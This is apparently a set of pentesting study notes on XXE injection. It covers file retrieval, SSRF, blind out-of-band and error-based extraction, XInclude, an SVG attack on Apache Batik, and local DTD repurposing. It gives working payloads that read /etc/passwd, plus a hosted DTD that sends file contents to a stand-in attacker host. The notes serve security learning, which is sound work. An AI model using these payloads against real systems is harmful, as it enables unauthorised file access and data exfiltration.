# XML External Entity (XXE) Injection
#File-Upload #Injection #OAST #SSRF #XML #XXE

XML external entity injection (also known as **XXE**) is a web security vulnerability that allows an attacker to interfere with an application's processing of **XML data**. It often allows an attacker to view files on the application server filesystem, and to interact with any **back-end or external systems** that the application itself can access.
___
## File Retrieval
To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to **modify** the submitted XML in two ways:

-   Introduce (or edit) a `DOCTYPE` element that **defines** an external entity containing the **path** to the file.
-   Edit a data value in the XML that is returned in the **application's response**, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>381</productId>
</stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```
___
## SSRF Attacks Using XXE
In the following XXE example, the external entity will cause the server to make a **back-end HTTP request** to an internal system within the organization's infrastructure:
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
___
## Blind XXE
Blind XXE vulnerabilities arise where the application is vulnerable to [XXE injection](https://portswigger.net/web-security/xxe) but **does not** return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally **harder** to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

-   You can trigger **out-of-band** network interactions, sometimes exfiltrating sensitive data within the interaction data.
-   You can trigger **XML parsing errors** in such a way that the error messages contain sensitive data.

### Hosting DTD Files
**Document Type Definition** files can be hosted externally and used when validation is used on the server side.

For example, you could host the following DTD File:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Referencing this `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>` can be used to read server-side files.

### Retrieving Data Via Error Messages
Server-side files can be read by causing an **error**. In this example, a **non-existant** file is queried which causes an **error** containing the name of the file. In this case, the name of the file is the contents of `/etc/passwd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
___
## XInclude Attacks
Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end **SOAP** request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the **entire** XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from **sub-documents**. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a **single** item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to **reference** the `XInclude` namespace and provide the path to the file that you wish to include. For example:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
___
## Apache Batik XXE Injection Vulnerability
**Apache Batik** is an image **processing** library which is vulnerable to an XXE injection attack. If an **SVG** is uploaded with the following content:
```XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>`
```

An image is processed and the contents of the image will be, in this case, the value within `/etc/hostname`.
___
## Repurposing Local DTD Files
[Exploiting blind XXE by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd)
[Wordlists for locating local DTD files and examples on how they can be exploited](https://github.com/GoSecure/dtd-finder)

Check whether or not a file is present on the server (response is **200** if present):
```
`<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file://FILE"> %local_dtd; ]>`
```

Example payload if the file `/usr/share/xml/fontconfig/fonts.dtd` is present on the **target system**:
```XML
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```